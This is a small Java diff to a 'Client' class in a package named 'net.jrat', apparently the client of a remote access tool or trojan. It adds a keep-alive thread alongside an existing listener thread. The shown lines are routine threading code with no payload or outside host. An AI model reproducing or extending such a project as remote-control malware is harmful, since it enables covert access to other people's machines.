@@ -5,6 +5,7 @@ import java.io.ObjectOutputStream;
 import java.net.Socket;
 
 import net.jrat.core.threads.ActionListener;
+import net.jrat.core.threads.KeepAliveLoop;
 
 public class Client
 {
@@ -24,8 +25,11 @@ public class Client
 		this.connected = false;
 		this.running = true;
 
-		final Thread thread = new Thread(new ActionListener(), "listener");
-		thread.start();
+		final Thread thread0 = new Thread(new ActionListener(), "listener");
+		final Thread thread1 = new Thread(new KeepAliveLoop(), "loop");
+
+		thread0.start();
+		thread1.start();
 	}
 	
 	public void uninstall()
